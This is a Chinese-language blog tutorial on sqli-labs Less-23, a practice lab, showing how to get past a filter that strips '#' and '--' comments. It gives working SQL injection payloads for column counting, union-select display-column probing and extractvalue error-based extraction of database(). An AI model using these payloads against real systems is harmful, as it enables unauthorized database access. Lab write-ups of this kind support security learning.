---
title: 绕过注释过滤
toc: true
description: 本文通过 sqli-lab 23 来介绍如何绕过注释被过滤的情况
categories:
    - websec
    - sql injection
date: 2019-08-04 09:06:49
tags:
---

## 检测注入点

?id=1'

回显：

> **Warning**: mysql_fetch_array() expects parameter 1 to be resource, boolean given in **C:\phpStudy\WWW\sqli-labs\Less-23\index.php** on line **38**
> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

根据报错：'1'' LIMIT 0,1，我们知道闭合方式为单引号，后面还有语句，可以用注释注释掉。

下面构造：?id=1' --+ 和 ?id=1' %23

均回显：

> **Warning**: mysql_fetch_array() expects parameter 1 to be resource, boolean given in **C:\phpStudy\WWW\sqli-labs\Less-23\index.php** on line **38**
> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1

按理说，不应该报错，就是报错也应该报：' -- LIMIT 0,1 或 ' # LIMIT 0,1，这里我们可以得出，两种注释被过滤掉了。

下面看看源码，

```php
$reg = "/#/";
$reg1 = "/--/";
$replace = "";
$id = preg_replace($reg, $replace, $id);
$id = preg_replace($reg1, $replace, $id);
```

pre_replace 函数

> mixed preg_replace (mixed pattern, mixed replacement, mixed string [, int limit [, int &$count]] );

preg_replace 函数执行一个正则表达式的搜索和替换,搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换,后面可选的参数是用来控制替换次数与替换执行次数的。

这里，我们正式再次说一下（之前博文中讲过），两种构造 payload 的小差异（其实差异也不大）。

1. 闭合前面的，注释后面的，在中间构造新语句
2. 闭合前面的，注释后面的，在中间构造语句（当然，可以用中间构造的一部分来闭合后面的）

之所以比较正式的提出这两种，是因为我们习惯了（尤指我）前一种（比较暴力，而且需要注释管用的方法），其实，从实用角度来看，后一种比较好，不用担心注释问题。

## 猜字段

?id=1' order by 3,'1 3 个字段

上面涉及一个小知识点：order by 后面可以跟逗号分隔的多列，进行多列排序，优先级当然是第一个优先。因此，我们可以多写一个列来闭合后面的引号。

## 查看显示位

?id=-1' union select 1,2,'3

注意：这里的第三个字段是用来与后面闭合的，'3',因此，不能用来显示东西。不信，你试试：?id=-1' union select 1,2,'version()
，可是如果只有 3 是显示位，那我们该怎么办呢？

提出以下两种改进方案：（我比较喜欢第一种，因为第二种查询了 database(),感觉有点过早地触发敏感信息。）
?id=-1' union select 1,2,3 union select 4,5,'6
?id=-1' union select 1,2,3 from (select database())a where '1

第一种，就是再来一个 union select，因为联合查询前面语句查出来的总是靠前，因此，1，2，3 还是可以用来监测显示位的。

第二种就是纯粹为了找个引号，然后从某个数据库中查 1 ，在 where 条件加一个引号。

当然，此关使用报错注入等方式也可以
?id=1' or extractvalue(1,concat(0x7e,database())) or '1'='1

后面的操作与之前类似，不再详解。
